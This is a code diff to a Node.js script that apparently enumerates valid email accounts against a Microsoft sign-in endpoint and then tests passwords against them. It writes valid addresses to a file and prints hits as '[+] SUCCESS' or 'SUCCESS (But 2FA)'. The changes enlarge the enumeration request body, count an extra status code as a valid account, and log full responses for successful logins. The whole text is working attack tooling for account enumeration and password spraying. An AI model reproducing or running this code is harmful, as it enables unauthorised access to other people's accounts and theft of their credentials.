@@ -29,7 +29,7 @@ function is_email_valid(email){
   if(mode == 2){
     is_password_valid(email)
   }else{
-    let bodyString = `{"Username":"${email.split(',')[0]}"}`
+    let bodyString = `{"Username":"${email.split(',')[0]}","isOtherIdpSupported":true,"checkPhones":false,"isRemoteNGCSupported":true,"isCookieBannerShown":false,"isFidoSupported":true,"country":"US","forceotclogin":false,"isExternalFederationDisallowed":false,"isRemoteConnectSupported":false,"federationFlags":0,"isSignup":false,"isAccessPassSupported":true}`
     
     let headers = {
         "Connection": "close", 
@@ -47,7 +47,7 @@ function is_email_valid(email){
     }
     request(options, function (error, response, body) {
       let email_status = JSON.parse(body).IfExistsResult
-      if(email_status == 0){
+      if(email_status == 5 || email_status == 0){
         console.log(FgBlue, `[*] VALID_EMAIL: ${email.split(',')[0]}`)
         stream.write(email + "\n")
         if(mode == 1){
@@ -86,8 +86,10 @@ function is_password_valid(email){
   request(options, function (error, response, body) {
     if(response.statusCode == 403){
       console.log(FgGreen, `[+] SUCCESS (But 2FA): ${email.split(',')[0]}:${pass}`)
+      console.log(response)
     }else if(response.statusCode == 200){
       console.log(FgGreen, `[+] SUCCESS: ${email.split(',')[0]}:${pass}`)
+      console.log(response)
     }else{
       console.log(FgRed, `[-] fail: ${email.split(',')[0]}:${pass}`)
     }
